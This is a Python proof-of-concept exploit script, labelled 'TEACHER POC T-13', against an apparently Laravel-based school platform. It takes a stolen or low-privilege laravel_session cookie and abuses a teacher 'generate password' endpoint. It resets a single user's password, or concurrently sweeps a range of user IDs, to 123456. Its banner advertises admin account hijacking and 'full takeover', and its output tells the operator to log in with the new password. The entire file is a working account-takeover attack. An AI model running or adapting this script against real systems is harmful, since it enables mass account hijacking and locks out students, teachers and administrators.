import sys
import asyncio
import aiohttp
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

# ── banner ────────────────────────────────────────────────────────────────────

def _build_banner():
    title_lines_raw = [
        " ____  _   __   _ ____  _____ ____  _____ ____  _____ ",
        "|  _ \\/ \\ |  \\ | |  _ \\| ____|  _ \\| ____/ ___||_   _|",
        "| |_) / _ \\|   \\| | |_) |  _| | |_) |  _| \\___ \\  | |  ",
        "|  __/ ___ \\ |\\  |  _ <| |___|  _ <| |___ ___) | | |  ",
        "|_| /_/   \\_\\_| \\_|_| \\_\\_____|_| \\_\\_____|____/  |_|  ",
    ]
    title_lines = [f"{RED}{l}{RESET}" for l in title_lines_raw]

    art = [
        f"  {DIM}user id 1 → {GREEN}123456{RESET}",
        f"  {DIM}user id 2 → {GREEN}123456{RESET}",
        f"  {DIM}user id 3 → {GREEN}123456{RESET}",
        f"  {DIM}(admin accounts){RESET}",
        f"  {RED}full takeover{RESET}",
    ]

    T = max(len(l) for l in title_lines_raw)
    top_pad    = [""] * 2
    bot_pad    = [""] * 2
    left_lines = top_pad + [f"{l}{' ' * (T - len(r))}" for l, r in zip(title_lines, title_lines_raw)] + bot_pad
    right_lines = [""] * 2 + art + [""] * 1

    out = ["\n"]
    for l, r in zip(left_lines, right_lines):
        out.append(f"  {l}   {r}")
    out.append(f"\n  {DIM}  mass password reset to 123456  ·  TEACHER POC T-13{RESET}\n")
    return "\n".join(out)

print(_build_banner())

# ── inputs ────────────────────────────────────────────────────────────────────

try:
    BASE_URL       = input(f"  {CYAN}[?]{RESET} Target URL             : ").strip().rstrip("/")
    SESSION_COOKIE = input(f"  {CYAN}[?]{RESET} laravel_session        : ").strip()
    MODE           = input(f"  {CYAN}[?]{RESET} Mode — [1] single  [2] range sweep: ").strip() or "1"
except KeyboardInterrupt:
    print(f"\n\n  {YELLOW}[!]{RESET} Aborted.")
    raise SystemExit(0)

ENDPOINT = f"{BASE_URL}/teacher/student/generate/password"
HDRS     = {
    "Cookie": f"laravel_session={SESSION_COOKIE}",
    "X-Requested-With": "XMLHttpRequest",
}

# ── single reset ──────────────────────────────────────────────────────────────

if MODE == "1":
    import requests
    try:
        uid = input(f"  {CYAN}[?]{RESET} Target user ID: ").strip()
    except KeyboardInterrupt:
        print(f"\n  {YELLOW}[!]{RESET} Aborted.")
        sys.exit(0)
    print(f"\n  {DIM}[>]{RESET} GET {ENDPOINT}?id={uid}&passwordtype=default")
    try:
        r = requests.get(ENDPOINT, params={"id": uid, "passwordtype": "default"},
                         headers=HDRS, timeout=8)
        sc = GREEN if r.status_code < 300 else RED
        print(f"  {DIM}[<]{RESET} {sc}{r.status_code}{RESET}")
        try:
            data = r.json()
            if (isinstance(data, list) and data and data[0].get("status") == 1) or \
               (isinstance(data, dict) and (data.get("status") == 1 or data.get("message","").lower().count("success"))):
                print(f"  {GREEN}[✓]{RESET} Password for user id={uid} reset to {YELLOW}123456{RESET}")
            else:
                print(f"  {DIM}    {data}{RESET}")
        except Exception:
            print(f"  {DIM}{r.text[:300]}{RESET}")
    except Exception as e:
        print(f"  {RED}[!]{RESET} {e}")
    sys.exit(0)

# ── range sweep ───────────────────────────────────────────────────────────────

try:
    uid_range = input(f"  {CYAN}[?]{RESET} User ID range [1-50]: ").strip() or "1-50"
    max_conc  = int(input(f"  {CYAN}[?]{RESET} Concurrency [20]    : ").strip() or "20")
except KeyboardInterrupt:
    print(f"\n  {YELLOW}[!]{RESET} Aborted.")
    sys.exit(0)

start_id, end_id = (int(x) for x in uid_range.split("-"))

reset_ok   = []
reset_fail = []

async def reset_uid(session, sem, uid, pbar):
    async with sem:
        try:
            async with session.get(
                ENDPOINT,
                params={"id": str(uid), "passwordtype": "default"},
                timeout=aiohttp.ClientTimeout(total=6)
            ) as resp:
                text = await resp.text()
                pbar.update(1)
                try:
                    import json
                    data = json.loads(text)
                    ok = (isinstance(data, list) and data and data[0].get("status") == 1) or \
                         (isinstance(data, dict) and (data.get("status") == 1 or "success" in str(data).lower()))
                    if ok:
                        reset_ok.append(uid)
                        pbar.set_postfix(reset=len(reset_ok))
                        tqdm.write(f"  {GREEN}[✓]{RESET} uid={uid} → password reset to {YELLOW}123456{RESET}")
                    else:
                        reset_fail.append(uid)
                except Exception:
                    reset_fail.append(uid)
        except Exception:
            reset_fail.append(uid)
            pbar.update(1)

async def run_sweep():
    sem = asyncio.Semaphore(max_conc)
    async with aiohttp.ClientSession(headers=HDRS) as session:
        ids = list(range(start_id, end_id + 1))
        with tqdm(total=len(ids), desc=f"  {RED}resetting{RESET}",
                  bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]") as pbar:
            tasks = [asyncio.create_task(reset_uid(session, sem, uid, pbar)) for uid in ids]
            await asyncio.gather(*tasks, return_exceptions=True)

print(f"\n  {YELLOW}[!]{RESET} Resetting user IDs {start_id}–{end_id} to {BOLD}123456{RESET}\n")
try:
    asyncio.run(run_sweep())
except KeyboardInterrupt:
    print(f"\n  {YELLOW}[!]{RESET} Interrupted.")

print(f"\n  {GREEN}[+]{RESET} Reset:  {BOLD}{len(reset_ok)}{RESET} accounts")
print(f"  {RED}[+]{RESET} Failed: {len(reset_fail)}")
if reset_ok:
    print(f"\n  {CYAN}[+]{RESET} Successfully reset IDs: {YELLOW}{reset_ok}{RESET}")
    print(f"  {DIM}    Try logging in with password: {RESET}{YELLOW}123456{RESET}")
